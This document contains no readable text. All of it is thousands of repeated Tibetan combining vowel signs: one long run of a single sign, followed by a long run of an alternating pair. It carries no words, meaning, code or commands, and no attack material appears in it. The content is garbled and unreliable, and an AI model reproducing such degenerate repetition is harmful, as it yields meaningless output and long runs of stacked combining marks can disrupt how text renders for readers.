ཱཱཱཱཱཱཱཱཱཱཱཱཱཱཱཱཱཱཱཱཱཱཱཱཱཱཱཱཱཱཱཱཱཱཱཱཱཱཱཱཱཱཱཱཱཱཱཱཱཱཱཱཱཱཱཱཱཱཱཱཱཱཱཱཱཱཱཱཱཱཱཱཱཱཱཱཱཱཱཱཱཱཱཱཱཱཱཱཱཱཱཱཱཱཱཱཱཱཱཱཱཱཱཱཱཱཱཱཱཱཱཱཱཱཱཱཱཱཱཱཱཱཱཱཱཱཱཱཱཱཱཱཱཱཱཱཱཱཱཱཱཱཱཱཱཱཱཱཱཱཱཱཱཱཱཱཱཱཱཱཱཱཱཱཱཱཱཱཱཱཱཱཱཱཱཱཱཱཱཱཱཱཱཱཱཱཱཱཱཱཱཱཱཱཱཱཱཱཱཱཱཱཱཱཱཱཱཱཱཱཱཱཱཱཱཱཱཱཱཱཱཱཱཱཱཱཱཱཱཱཱཱཱཱཱཱཱཱཱཱཱཱཱཱཱཱཱཱཱཱཱཱཱཱཱཱཱཱཱཱཱཱཱཱཱཱཱཱཱཱཱཱཱཱཱཱཱཱཱཱཱཱཱཱཱཱཱཱཱཱཱཱཱཱཱཱཱཱཱཱཱཱཱཱཱཱཱཱཱཱཱཱཱཱཱཱཱཱཱཱཱཱཱཱཱཱཱཱཱཱཱཱཱཱཱཱཱཱཱཱཱཱཱཱཱཱཱཱཱཱཱཱཱཱཱཱཱཱཱཱཱཱཱཱཱཱཱཱཱཱཱཱཱཱཱཱཱཱཱཱཱཱཱཱཱཱཱཱཱཱཱཱཱཱཱཱཱཱཱཱཱཱཱཱཱཱཱཱཱཱཱཱཱཱཱཱཱཱཱཱཱཱཱཱཱཱཱཱཱཱཱཱཱཱཱཱཱཱཱཱཱཱཱཱཱཱཱཱཱཱཱཱཱཱཱཱཱཱཱཱཱཱཱཱཱཱཱཱཱཱཱཱཱཱཱཱཱཱཱཱཱཱཱཱཱཱཱཱཱཱཱཱཱཱཱཱཱཱཱཱཱཱཱཱཱཱཱཱཱཱཱཱཱཱཱཱཱཱཱཱཱཱཱཱཱཱཱཱཱཱཱཱཱཱཱཱཱཱཱཱཱཱཱཱཱཱཱཱཱཱཱཱཱཱཱཱཱཱཱཱཱཱཱཱཱཱཱཱཱཱཱཱཱཱཱཱཱཱཱཱཱཱཱཱཱཱཱཱཱཱཱཱཱཱཱཱཱཱཱཱཱཱཱཱཱཱཱཱཱཱཱཱཱཱཱཱཱཱཱཱཱཱཱཱཱཱཱཱཱཱཱཱཱཱཱཱཱཱཱཱཱཱཱཱཱཱཱཱཱཱཱཱཱཱཱཱཱཱཱཱཱཱཱཱཱཱཱཱཱཱཱཱཱཱཱཱཱཱཱཱཱཱཱཱཱཱཱཱཱཱཱཱཱཱཱཱཱཱཱཱཱཱཱཱཱཱཱཱཱཱཱཱཱཱཱཱཱཱཱཱཱཱཱཱཱཱཱཱཱཱཱཱཱཱཱཱཱཱཱཱཱཱཱཱཱཱཱཱཱཱཱཱཱཱཱཱཱཱཱཱཱཱཱཱཱཱཱཱཱཱཱཱཱཱཱཱཱཱཱཱཱཱཱཱཱཱཱཱཱཱཱཱཱཱཱཱཱཱཱཱཱཱཱཱཱཱཱཱཱཱཱཱཱཱཱཱཱཱཱཱཱཱཱཱཱཱཱཱཱཱཱཱཱཱཱཱཱཱཱཱཱཱཱཱཱཱཱཱཱཱཱཱཱཱཱཱཱཱཱཱཱཱཱཱཱཱཱཱཱཱཱཱཱཱཱཱཱཱཱཱཱཱཱཱཱཱཱཱཱཱཱཱཱཱཱཱཱཱཱཱཱཱཱཱཱཱཱཱཱཱཱཱཱཱཱཱཱཱཱཱཱཱཱཱཱཱཱཱཱཱཱཱཱཱཱཱཱཱཱཱཱཱཱཱཱཱཱཱཱཱཱཱཱཱཱཱཱཱཱཱཱཱཱཱཱཱཱཱཱཱཱཱཱཱཱཱཱཱཱཱཱཱཱཱཱཱཱཱཱཱཱཱཱཱཱཱཱཱཱཱཱཱཱཱཱཱཱཱཱཱཱཱཱཱཱཱཱཱཱཱཱཱཱཱཱཱཱཱཱཱཱཱཱཱཱཱཱཱཱཱཱཱཱཱཱཱཱཱཱཱཱཱཱཱཱཱཱཱཱཱཱཱཱཱཱཱཱཱཱཱཱཱཱཱཱཱཱཱཱཱཱཱཱཱཱཱཱཱཱཱཱཱཱཱཱཱཱཱཱཱཱཱཱཱཱཱཱཱཱཱཱཱཱཱཱཱཱཱཱཱཱཱཱཱཱཱཱཱཱཱཱཱཱཱཱཱཱཱཱཱཱཱཱཱཱཱཱཱཱཱཱཱཱཱཱཱཱཱཱཱཱཱཱཱཱཱཱཱཱཱཱཱཱཱཱཱཱཱཱཱཱཱཱཱཱཱཱཱཱཱཱཱཱཱཱཱཱཱཱཱཱཱཱཱཱཱཱཱཱཱཱཱཱཱཱཱཱཱཱཱཱཱཱཱཱཱཱཱཱཱཱཱཱཱཱཱཱཱཱཱཱཱཱཱཱཱཱཱཱཱཱཱཱཱཱཱཱཱཱཱཱཱཱཱཱཱཱཱཱཱཱཱཱཱཱཱཱཱཱཱཱཱཱཱཱཱཱཱཱཱཱཱཱཱཱཱཱཱཱཱཱཱཱཱཱཱཱཱཱཱཱཱཱཱཱཱཱཱཱཱཱཱཱཱཱཱཱཱཱཱཱཱཱཱཱཱཱཱཱཱཱཱཱཱཱཱཱཱཱཱཱཱཱཱཱཱཱཱཱཱཱཱཱཱཱཱཱཱཱཱཱཱཱཱཱཱཱཱཱཱཱཱཱཱཱཱཱཱཱཱཱཱཱཱཱཱཱཱཱཱཱཱཱཱཱཱཱཱཱཱཱཱཱཱཱཱཱཱཱཱཱཱཱཱཱཱཱཱཱཱཱཱཱཱཱཱཱཱཱཱཱཱཱཱཱཱཱཱཱཱཱཱཱཱཱཱཱཱཱཱཱཱཱཱཱཱཱཱཱཱཱཱཱཱཱཱཱཱཱཱཱཱཱཱཱཱཱཱཱཱཱཱཱཱཱཱཱཱཱཱཱཱཱཱཱཱཱཱཱཱཱཱཱཱཱཱཱཱཱཱཱཱཱཱཱཱཱཱཱཱཱཱཱཱཱཱཱཱཱཱཱཱཱཱཱཱཱཱཱཱཱཱཱཱཱཱཱཱཱཱཱཱཱཱཱཱཱཱཱཱཱཱཱཱཱཱཱཱཱཱཱཱཱཱཱཱཱཱཱཱཱཱཱཱཱཱཱཱཱཱཱཱཱཱཱཱཱཱཱཱཱཱཱཱཱཱཱཱཱཱཱཱཱཱཱཱཱཱཱཱཱཱཱཱཱཱཱཱཱཱཱཱཱཱཱཱཱཱཱཱཱཱཱཱཱཱཱཱཱཱཱཱཱཱཱཱཱཱཱཱཱཱཱཱཱཱཱཱཱཱཱཱཱཱཱཱཱཱཱཱཱཱཱཱཱཱཱཱཱཱཱཱཱཱཱཱཱཱཱཱཱཱཱཱཱཱཱཱཱཱཱཱཱཱཱཱཱཱཱཱཱཱཱཱཱཱཱཱཱཱཱཱཱཱཱཱཱཱཱཱཱཱཱཱཱཱཱཱཱཱཱཱཱཱཱཱཱཱཱཱཱཱཱཱཱཱཱཱཱཱཱཱཱཱཱཱཱཱཱཱཱཱཱཱཱཱཱཱཱཱཱཱཱཱཱཱཱཱཱཱཱཱཱཱཱཱཱཱཱཱཱཱཱཱཱཱཱཱཱཱཱཱཱཱཱཱཱཱཱཱཱཱཱཱཱཱཱཱཱཱཱཱཱཱཱཱཱཱཱཱཱཱཱཱཱཱཱཱཱཱཱཱཱཱཱཱཱཱཱཱཱཱཱཱཱཱཱཱཱཱཱཱཱཱཱཱཱཱཱཱཱཱཱཱཱཱཱཱཱཱཱཱཱཱཱཱཱཱཱཱཱཱཱཱཱཱཱཱཱཱཱཱཱཱཱཱཱཱཱཱཱཱཱཱཱཱཱཱཱཱཱཱཱཱཱཱཱཱཱཱཱཱཱཱཱཱཱཱཱཱཱཱཱཱཱཱཱཱཱཱཱཱཱཱཱཱཱཱཱཱཱཱཱཱཱཱཱཱཱཱཱཱཱཱཱཱཱཱཱཱཱཱཱཱཱཱཱཱཱཱཱཱཱཱཱཱཱཱཱཱཱཱཱཱཱཱཱཱཱཱཱཱཱཱཱཱཱཱཱཱཱཱཱཱཱཱཱཱཱཱཱཱཱཱཱཱཱཱཱཱཱཱཱཱཱཱཱཱཱཱཱཱཱཱཱཱཱཱཱཱཱཱཱཱཱཱཱཱཱཱཱཱཱཱཱཱཱཱཱཱཱཱཱཱཱཱཱཱཱཱཱཱཱཱཱཱཱཱཱཱཱཱཱཱཱཱཱཱཱཱཱཱཱཱཱཱཱཱཱཱཱཱཱཱཱཱཱཱཱཱཱཱཱཱཱཱཱཱཱཱཱཱཱཱཱཱཱཱཱཱཱཱཱཱཱཱཱཱཱཱཱཱཱཱཱཱཱཱཱཱཱཱཱཱཱཱཱཱཱཱཱཱཱཱཱཱཱཱཱཱཱཱཱཱཱཱཱཱཱཱཱཱཱཱཱཱཱཱཱཱཱཱཱཱཱཱཱཱཱཱཱཱཱཱཱཱཱཱཱཱཱཱཱཱཱཱཱཱཱཱཱཱཱཱཱཱཱཱཱཱཱཱཱཱཱཱཱཱཱཱཱཱཱཱཱཱཱཱཱཱཱཱཱཱཱཱཱཱཱཱཱཱཱཱཱཱཱཱཱཱཱཱཱཱཱཱཱཱཱཱཱཱཱཱཱཱཱཱཱཱཱཱཱཱཱཱཱཱཱཱཱཱཱཱཱཱཱཱཱཱཱཱཱཱཱཱཱཱཱཱཱཱཱཱཱཱཱཱཱཱཱཱཱཱཱཱཱཱཱཱཱཱཱཱཱཱཱཱཱཱཱཱཱཱཱཱཱཱཱཱཱཱཱཱཱཱཱཱཱཱཱཱཱཱཱཱཱཱཱཱཱཱཱཱཱཱཱཱཱཱཱཱཱཱཱཱཱཱཱཱཱཱཱཱཱཱཱཱཱཱཱཱཱཱཱཱཱཱཱཱཱཱཱཱཱཱཱཱཱཱཱཱཱཱཱཱཱཱཱཱཱཱཱཱཱཱཱཱཱཱཱཱཱཱཱཱཱཱཱཱཱཱཱཱཱཱཱཱཱཱཱཱཱཱཱཱཱཱཱཱཱཱཱཱཱཱཱཱཱཱཱཱཱཱཱཱཱཱཱཱཱཱཱཱཱཱཱཱཱཱཱཱཱཱཱཱཱཱཱཱཱཱཱཱཱཱཱཱཱཱཱཱཱཱཱཱཱཱཱཱཱཱཱཱཱཱཱཱཱཱཱཱཱཱཱཱཱཱཱཱཱཱཱཱཱཱཱཱཱཱཱཱཱཱཱཱཱཱཱཱཱཱཱཱཱཱཱཱཱཱཱཱཱཱཱཱཱཱཱཱཱཱཱཱཱཱཱཱཱཱཱཱཱཱཱཱཱཱཱཱཱཱཱཱཱཱཱཱཱཱཱཱཱཱཱཱཱཱཱཱཱཱཱཱཱཱཱཱཱཱཱཱཱཱཱཱཱཱཱཱཱཱཱཱཱཱཱཱཱཱཱཱཱཱཱཱཱཱཱཱཱཱཱཱཱཱཱཱཱཱཱཱཱཱཱཱཱཱཱཱཱཱཱཱཱཱཱཱཱཱཱཱཱཱཱཱཱཱཱཱཱཱཱཱཱཱཱཱཱཱཱཱཱཱཱཱཱཱཱཱཱཱཱཱཱཱཱཱཱཱཱཱཱཱཱཱཱཱཱཱཱཱཱཱཱཱཱཱཱཱཱཱཱཱཱཱཱཱཱཱཱཱཱཱཱཱཱཱཱཱཱཱཱཱཱཱཱཱཱཱཱཱཱཱཱཱཱཱཱཱཱཱཱཱཱཱཱཱཱཱཱཱཱཱཱཱཱཱཱཱཱཱཱཱཱཱཱཱཱཱཱཱཱཱཱཱཱཱཱཱཱཱཱཱཱཱཱཱཱཱཱཱཱཱཱཱཱཱཱཱཱཱཱཱཱཱཱཱཱཱཱཱཱཱཱཱཱཱཱཱཱཱཱཱཱཱཱཱཱཱཱཱཱཱཱཱཱཱཱཱཱཱཱཱཱཱཱཱཱཱཱཱཱཱཱཱཱཱཱཱཱཱཱཱཱཱཱཱཱཱཱཱཱཱཱཱཱཱཱཱཱཱཱཱཱཱཱཱཱཱཱཱཱཱཱཱཱཱཱཱཱཱཱཱཱཱཱཱཱཱཱཱཱཱཱཱཱཱཱཱཱཱཱཱཱཱཱཱཱཱཱཱཱཱཱཱཱཱཱཱཱཱཱཱཱཱཱཱཱཱཱཱཱཱཱཱཱཱཱཱཱཱཱཱཱཱཱཱཱཱཱཱཱཱཱཱཱཱཱཱཱཱཱཱཱཱཱཱཱཱཱཱཱཱཱཱཱཱཱཱཱཱཱཱཱཱཱཱཱཱཱཱཱཱཱཱཱཱཱཱཱཱཱཱཱཱཱཱཱཱཱཱཱཱཱཱཱཱཱཱཱཱཱཱཱཱཱཱཱཱཱཱཱཱཱཱཱཱཱཱཱཱཱཱཱཱཱཱཱཱཱཱཱཱཱཱཱཱཱཱཱཱཱཱཱཱཱཱཱཱཱཱཱཱཱཱཱཱཱཱཱཱཱཱཱཱཱཱཱཱཱཱཱཱཱཱཱཱཱཱཱཱཱཱཱཱཱཱཱཱཱཱཱཱཱཱཱཱཱཱཱཱཱཱཱཱཱཱཱཱཱཱཱཱཱཱཱཱཱཱཱཱཱཱཱཱཱཱཱཱཱཱཱཱཱཱཱཱཱཱཱཱཱཱཱཱཱཱཱཱཱཱཱཱཱཱཱཱཱཱཱཱཱཱཱཱཱཱཱཱཱཱཱཱཱཱཱཱཱཱཱཱཱཱཱཱཱཱཱཱཱཱཱཱཱཱཱཱཱཱཱཱཱཱཱཱཱཱཱཱཱཱཱཱཱཱཱཱཱཱཱཱཱཱཱཱཱཱཱཱཱཱཱཱཱཱཱཱཱཱཱཱཱཱཱཱཱཱཱཱཱཱཱཱཱཱཱཱཱཱཱཱཱཱཱཱཱཱཱཱཱཱཱཱཱཱཱཱཱཱཱཱཱཱཱཱཱཱཱཱཱཱཱཱཱཱཱཱཱཱཱཱཱཱཱཱཱཱཱཱཱཱཱཱཱཱཱཱཱཱཱཱཱཱཱཱཱཱཱཱཱཱཱཱཱཱཱཱཱཱཱཱཱཱཱཱཱཱཱཱཱཱཱཱཱཱཱཱཱཱཱཱཱཱཱཱཱཱཱཱཱཱཱཱཱཱཱཱཱཱཱཱཱཱཱཱཱཱཱཱཱཱཱཱཱཱཱཱཱཱཱཱཱཱཱཱཱཱཱཱཱཱཱཱཱཱཱཱཱཱཱཱཱཱཱཱཱཱཱཱཱཱཱཱཱཱཱཱཱཱཱཱཱཱཱཱཱཱཱཱཱཱཱཱཱཱཱཱཱཱཱཱཱཱཱཱཱཱཱཱཱཱཱཱཱཱཱཱཱཱཱཱཱཱཱཱཱཱཱཱཱཱཱཱཱཱཱཱཱཱཱཱཱཱཱཱཱཱཱཱཱཱཱཱཱཱཱཱཱཱཱཱཱཱཱཱཱཱཱཱཱཱཱཱཱཱཱཱཱཱཱཱཱཱཱཱཱཱཱཱཱཱཱཱཱཱཱཱཱཱཱཱཱཱཱཱཱཱཱཱཱཱཱཱཱཱཱཱཱཱཱཱཱཱཱཱཱཱཱཱཱཱཱཱཱཱཱཱཱཱཱཱཱཱཱཱཱཱཱཱཱཱཱཱཱཱཱཱཱཱཱཱཱཱཱཱཱཱཱཱཱཱཱཱཱཱཱཱཱཱཱཱཱཱཱཱཱཱཱཱཱཱཱཱཱཱཱཱཱཱཱཱཱཱཱཱཱཱཱཱཱཱཱཱཱཱཱཱཱཱཱཱཱཱཱཱཱཱཱཱཱཱཱཱཱཱཱཱཱཱཱཱཱཱཱཱཱཱཱཱཱཱཱཱཱཱཱཱཱཱཱཱཱཱཱཱཱཱཱཱཱཱཱཱཱཱཱཱཱཱཱཱཱཱཱཱཱཱཱཱཱཱཱཱཱཱཱཱཱཱཱཱཱཱཱཱཱཱཱཱཱཱཱཱཱཱཱཱཱཱཱཱཱཱཱཱཱཱཱཱཱཱཱཱཱཱཱཱཱཱཱཱཱཱཱཱཱཱཱཱཱཱཱཱཱཱཱཱཱཱཱཱཱཱཱཱཱཱཱཱཱཱཱཱཱཱཱཱཱཱཱཱཱཱཱཱཱཱཱཱཱཱཱཱཱཱཱཱཱཱཱཱཱཱཱཱཱཱཱཱཱཱཱཱཱཱཱཱཱཱཱཱཱཱཱཱཱཱཱཱཱཱཱཱཱཱཱཱཱཱཱཱཱཱཱཱཱཱཱཱཱཱཱཱཱཱཱཱཱཱཱཱཱཱཱཱཱཱཱཱཱཱཱཱཱཱཱཱཱཱཱཱཱཱཱཱཱཱཱཱཱཱཱཱཱཱཱཱཱཱཱཱཱཱཱཱཱཱཱཱཱཱཱཱཱཱཱཱཱཱཱཱཱཱཱཱཱཱཱཱཱཱཱཱཱཱཱཱཱཱཱཱཱཱཱཱཱཱཱཱཱཱཱཱཱཱཱཱཱཱཱཱཱཱཱཱཱཱཱཱཱཱཱཱཱཱཱཱཱཱཱཱཱཱཱཱཱཱཱཱཱཱཱཱཱཱཱཱཱཱཱཱཱཱཱཱཱཱཱཱཱཱཱཱཱཱཱཱཱཱཱཱཱཱཱཱཱཱཱཱཱཱཱཱཱཱཱཱཱཱཱཱཱཱཱཱཱཱཱཱཱཱཱཱཱཱཱཱཱཱཱཱཱཱཱིྀིྀིྀིྀིྀིྀིྀིྀིྀིྀིྀིྀིྀིྀིྀིྀིྀིྀིྀིྀིྀིྀིྀིྀིྀིྀིྀིྀིྀིྀིྀིྀིྀིྀིྀིྀིྀིྀིྀིྀིྀིྀིྀིྀིྀིྀིྀིྀིྀིྀིྀིྀིྀིྀིྀིྀིྀིྀིྀིྀིྀིྀིྀིྀིྀིྀིྀིྀིྀིྀིྀིྀིྀིྀིྀིྀིྀིྀིྀིྀིྀིྀིྀིྀིྀིྀིྀིྀིྀིྀིྀིྀིྀིྀིྀིྀིྀིྀིྀིྀིྀིྀིྀིྀིྀིྀིྀིྀིྀིྀིྀིྀིྀིྀིྀིྀིྀིྀིྀིྀིྀིྀིྀིྀིྀིྀིྀིྀིྀིྀིྀིྀིྀིྀིྀིྀིྀིྀིྀིྀིྀིྀིྀིྀིྀིྀིྀིྀིྀིྀིྀིྀིྀིྀིྀིྀིྀིྀིྀིྀིྀིྀིྀིྀིྀིྀིྀིྀིྀིྀིྀིྀིྀིྀིྀིྀིྀིྀིྀིྀིྀིྀིྀིྀིྀིྀིྀིྀིྀིྀིྀིྀིྀིྀིྀིྀིྀིྀིྀིྀིྀིྀིྀིྀིྀིྀིྀིྀིྀིྀིྀིྀིྀིྀིྀིྀིྀིྀིྀིྀིྀིྀིྀིྀིྀིྀིྀིྀིྀིྀིྀིྀིྀིྀིྀིྀིྀིྀིྀིྀིྀིྀིྀིྀིྀིྀིྀིྀིྀིྀིྀིྀིྀིྀིྀིྀིྀིྀིྀིྀིྀིྀིྀིྀིྀིྀིྀིྀིྀིྀིྀིྀིྀིྀིྀིྀིྀིྀིྀིྀིྀིྀིྀིྀིྀིྀིྀིྀིྀིྀིྀིྀིྀིྀིྀིྀིྀིྀིྀིྀིྀིྀིྀིྀིྀིྀིྀིྀིྀིྀིྀིྀིྀིྀིྀིྀིྀིྀིྀིྀིྀིྀིྀིྀིྀིྀིྀིྀིྀིྀིྀིྀིྀིྀིྀིྀིྀིྀིྀིྀིྀིྀིྀིྀིྀིྀིྀིྀིྀིྀིྀིྀིྀིྀིྀིྀིྀིྀིྀིྀིྀིྀིྀིྀིྀིྀིྀིྀིྀིྀིྀིྀིྀིྀིྀིྀིྀིྀིྀིྀིྀིྀིྀིྀིྀིྀིྀིྀིྀིྀིྀིྀིྀིྀིྀིྀིྀིྀིྀིྀིྀིྀིྀིྀིྀིྀིྀིྀིྀིྀིྀིྀིྀིྀིྀིྀིྀིྀིྀིྀིྀིྀིྀིྀིྀིྀིྀིྀིྀིྀིྀིྀིྀིྀིྀིྀིྀིྀིྀིྀིྀིྀིྀིྀིྀིྀིྀིྀིྀིྀིྀིྀིྀིྀིྀིྀིྀིྀིྀིྀིྀིྀིྀིྀིྀིྀིྀིྀིྀིྀིྀིྀིྀིྀིྀིྀིྀིྀིྀིྀིྀིྀིྀིྀིྀིྀིྀིྀིྀིྀིྀིྀིྀིྀིྀིྀིྀིྀིྀིྀིྀིྀིྀིྀིྀིྀིྀིྀིྀིྀིྀིྀིྀིྀིྀིྀིྀིྀིྀིྀིྀིྀིྀིྀིྀིྀིྀིྀིྀིྀིྀིྀིྀིྀིྀིྀིྀིྀིྀིྀིྀིྀིྀིྀིྀིྀིྀིྀིྀིྀིྀིྀིྀིྀིྀིྀིྀིྀིྀིྀིྀིྀིྀིྀིྀིྀིྀིྀིྀིྀིྀིྀིྀིྀིྀིྀིྀིྀིྀིྀིྀིྀིྀིྀིྀིྀིྀིྀིྀིྀིྀིྀིྀིྀིྀིྀིྀིྀིྀིྀིྀིྀིྀིྀིྀིྀིྀིྀིྀིྀིྀིྀིྀིྀིྀིྀིྀིྀིྀིྀིྀིྀིྀིྀིྀིྀིྀིྀིྀིྀིྀིྀིྀིྀིྀིྀིྀིྀིྀིྀིྀིྀིྀིྀིྀིྀིྀིྀིྀིྀིྀིྀིྀིྀིྀིྀིྀིྀིྀིྀིྀིྀིྀིྀིྀིྀིྀིྀིྀིྀིྀིྀིྀིྀིྀིྀིྀིྀིྀིྀིྀིྀིྀིྀིྀིྀིྀིྀིྀིྀིྀིྀིྀིྀིྀིྀིྀིྀིྀིྀིྀིྀིྀིྀིྀིྀིྀིྀིྀིྀིྀིྀིྀིྀིྀིྀིྀིྀིྀིྀིྀིྀིྀིྀིྀིྀིྀིྀིྀིྀིྀིྀིྀིྀིྀིྀིྀིྀིྀིྀིྀིྀིྀིྀིྀིྀིྀིྀིྀིྀིྀིྀིྀིྀིྀིྀིྀིྀིྀིྀིྀིྀིྀིྀིྀིྀིྀིྀིྀིྀིྀིྀིྀིྀིྀིྀིྀིྀིྀིྀིྀིྀིྀིྀིྀིྀིྀིྀིྀིྀིྀིྀིྀིྀིྀིྀིྀིྀིྀིྀིྀིྀིྀིྀིྀིྀིྀིྀིྀིྀིྀིྀིྀིྀིྀིྀིྀིྀིྀིྀིྀིྀིྀིྀིྀིྀིྀིྀིྀིྀིྀིྀིྀིྀིྀིྀིྀིྀིྀིྀིྀིྀིྀིྀིྀིྀིྀིྀིྀིྀིྀིྀིྀིྀིྀིྀིྀིྀིྀིྀིྀིྀིྀིྀིྀིྀིྀིྀིྀིྀིྀིྀིྀིྀིྀིྀིྀིྀིྀིྀིྀིྀིྀིྀིྀིྀིྀིྀིྀིྀིྀིྀིྀིྀིྀིྀིྀིྀིྀིྀིྀིྀིྀིྀིྀིྀིྀིྀིྀིྀིྀིྀིྀིྀིྀིྀིྀིྀིྀིྀིྀིྀིྀིྀིྀིྀིྀིྀིྀིྀིྀིྀིྀིྀིྀིྀིྀིྀིྀིྀིྀིྀིྀིྀིྀིྀིྀིྀིྀིྀིྀིྀིྀིྀིྀིྀིྀིྀིྀིྀིྀིྀིྀིྀིྀིྀིྀིྀིྀིྀིྀིྀིྀིྀིྀིྀིྀིྀིྀིྀིྀིྀིྀིྀིྀིྀིྀིྀིྀིྀིྀིྀིྀིྀིྀིྀིྀིྀིྀིྀིྀིྀིྀིྀིྀིྀིྀིྀིྀིྀིྀིྀིྀིྀིྀིྀིྀིྀིྀིྀིྀིྀིྀིྀིྀིྀིྀིྀིྀིྀིྀིྀིྀིྀིྀིྀིྀིྀིྀིྀིྀིྀིྀིྀིྀིྀིྀིྀིྀིྀིྀིྀིྀིྀིྀིྀིྀིྀིྀིྀིྀིྀིྀིྀིྀིྀིྀིྀིྀིྀིྀིྀིྀིྀིྀིྀིྀིྀིྀིྀིྀིྀིྀིྀིྀིྀིྀིྀིྀིྀིྀིྀིྀིྀིྀིྀིྀིྀིྀིྀིྀིྀིྀིྀིྀིྀིྀིྀིྀིྀིྀིྀིྀིྀིྀིྀིྀིྀིྀིྀིྀིྀིྀིྀིྀིྀིྀིྀིྀིྀིྀིྀིྀིྀིྀིྀིྀིྀིྀིྀིྀིྀིྀིྀིྀིྀིྀིྀིྀིྀིྀིྀིྀིྀིྀིྀིྀིྀིྀིྀིྀིྀིྀིྀིྀིྀིྀིྀིྀིྀིྀིྀིྀིྀིྀིྀིྀིྀིྀིྀིྀིྀིྀིྀིྀིྀིྀིྀིྀིྀིྀིྀིྀིྀིྀིྀིྀིྀིྀིྀིྀིྀིྀིྀིྀིྀིྀིྀིྀིྀིྀིྀིྀིྀིྀིྀིྀིྀིྀིྀིྀིྀིྀིྀིྀིྀིྀིྀིྀིྀིྀིྀིྀིྀིྀིྀིྀིྀིྀིྀིྀིྀིྀིྀིྀིྀིྀིྀིྀིྀིྀིྀིྀིྀིྀིྀིྀིྀིྀིྀིྀིྀིྀིྀིྀིྀིྀིྀིྀིྀིྀིྀིྀིྀིྀིྀིྀིྀིྀིྀིྀིྀིྀིྀིྀིྀིྀིྀིྀིྀིྀིྀིྀིྀིྀིྀིྀིྀིྀིྀིྀིྀིྀིྀིྀིྀིྀིྀིྀིྀིྀིྀིྀིྀིྀིྀིྀིྀིྀིྀིྀིྀིྀིྀིྀིྀིྀིྀིྀིྀིྀིྀིྀིྀིྀིྀིྀིྀིྀིྀིྀིྀིྀིྀིྀིྀིྀིྀིྀིྀིྀིྀིྀིྀིྀིྀིྀིྀིྀིྀིྀིྀིྀིྀིྀིྀིྀིྀིྀིྀིྀིྀིྀིྀིྀིྀིྀིྀིྀིྀིྀིྀིྀིྀིྀིྀིྀིྀིྀིྀིྀིྀིྀིྀིྀིྀིྀིྀིྀིྀིྀིྀིྀིྀིྀིྀིྀིྀིྀིྀིྀིྀིྀིྀིྀིྀིྀིྀིྀིྀིྀིྀིྀིྀིྀིྀིྀིྀིྀིྀིྀིྀིྀིྀིྀིྀིྀིྀིྀིྀིྀིྀིྀིྀིྀིྀིྀིྀིྀིྀིྀིྀིྀིྀིྀིྀིྀིྀིྀིྀིྀིྀིྀིྀིྀིྀིྀིྀིྀིྀིྀིྀིྀིྀིྀིྀིྀིྀིྀིྀིྀིྀིྀིྀིྀིྀིྀིྀིྀིྀིྀིྀིྀིྀིྀིྀིྀིྀིྀིྀིྀིྀིྀིྀིྀིྀིྀིྀིྀིྀིྀིྀིྀིྀིྀིྀིྀིྀིྀིྀིྀིྀིྀིྀིྀིྀིྀིྀིྀིྀིྀིྀིྀིྀིྀིྀིྀིྀིྀིྀིྀིྀིྀིྀིྀིྀིྀིྀིྀིྀིྀིྀིྀིྀིྀིྀིྀིྀིྀིྀིྀིྀིྀིྀིྀིྀིྀིྀིྀིྀིྀིྀིྀིྀིྀིྀིྀིྀིྀིྀིྀིྀིྀིྀིྀིྀིྀིྀིྀིྀིྀིྀིྀིྀིྀིྀིྀིྀིྀིྀིྀིྀིྀིྀིྀིྀིྀིྀིྀིྀིྀིྀིྀིྀིྀིྀིྀིྀིྀིྀིྀིྀིྀིྀིྀིྀིྀིྀིྀིྀིྀིྀིྀིྀིྀིྀིྀིྀིྀིྀིྀིྀིྀིྀིྀིྀིྀིྀིྀིྀིྀིྀིྀིྀིྀིྀིྀིྀིྀིྀིྀིྀིྀིྀིྀིྀིྀིྀིྀིྀིྀིྀིྀིྀིྀིྀིྀིྀིྀིྀིྀིྀིྀིྀིྀིྀིྀིྀིྀིྀིྀིྀིྀིྀིྀིྀིྀིྀིྀིྀིྀིྀིྀིྀིྀིྀིྀིྀིྀིྀིྀིྀིྀིྀིྀིྀིྀིྀིྀིྀིྀིྀིྀིྀིྀིྀིྀིྀིྀིྀིྀིྀིྀིྀིྀིྀིྀིྀིྀིྀིྀིྀིྀིྀིྀིྀིྀིྀིྀིྀིྀིྀིྀིྀིྀིྀིྀིྀིྀིྀིྀིྀིྀིྀིྀིྀིྀིྀིྀིྀིྀིྀིྀིྀིྀིྀིྀིྀིྀིྀིྀིྀིྀིྀིྀིྀིྀིྀིྀིྀིྀིྀིྀིྀིྀིྀིྀིྀིྀིྀིྀིྀིྀིྀིྀིྀིྀིྀིྀིྀིྀིྀིྀིྀིྀིྀིྀིྀིྀིྀིྀིྀིྀིྀིྀིྀིྀིྀིྀིྀིྀིྀིྀིྀིྀིྀིྀིྀིྀིྀིྀིྀིྀིྀིྀིྀིྀིྀིྀིྀིྀིྀིྀིྀིྀིྀིྀིྀིྀིྀིྀིྀིྀིྀིྀིྀིྀིྀིྀིྀིྀིྀིྀིྀིྀིྀིྀིྀིྀིྀིྀིྀིྀིྀིྀིྀིྀིྀིྀིྀིྀིྀིྀིྀིྀིྀིྀིྀིྀིྀིྀིྀིྀིྀིྀིྀིྀིྀིྀིྀིྀིྀིྀིྀིྀིྀིྀིྀིྀིྀིྀིྀིྀིྀིྀིྀིྀིྀིྀིྀིྀིྀིྀིྀིྀིྀིྀིྀིྀིྀིྀིྀིྀིྀིྀིྀིྀིྀིྀིྀིྀིྀིྀིྀིྀིྀིྀིྀིྀིྀིྀིྀིྀིྀིྀིྀིྀིྀིྀིྀིྀིྀིྀིྀིྀིྀིྀིྀིྀིྀིྀིྀིྀིྀིྀིྀིྀིྀིྀིྀིྀིྀིྀིྀིྀིྀིྀིྀིྀིྀིྀིྀིྀིྀིྀིྀིྀིྀིྀིྀིྀིྀིྀིྀིྀིྀིྀིྀིྀིྀིྀིྀིྀིྀིྀིྀིྀིྀིྀིྀིྀིྀིྀིྀིྀིྀིྀིྀིྀིྀིྀིྀིྀིྀིྀིྀིྀིྀིྀིྀིྀིྀིྀིྀིྀིྀིྀིྀིྀིྀིྀིྀིྀིྀིྀིྀིྀིྀིྀིྀིྀིྀིྀིྀིྀིྀིྀིྀིྀིྀིྀིྀིྀིྀིྀིྀིྀིྀིྀིྀིྀིྀིྀིྀིྀིྀིྀིྀིྀིྀིྀིྀིྀིྀིྀིྀིྀིྀིྀིྀིྀིྀིྀིྀིྀིྀིྀིྀིྀིྀིྀིྀིྀིྀིྀིྀིྀིྀིྀིྀིྀིྀིྀིྀིྀིྀིྀིྀིྀིྀིྀིྀི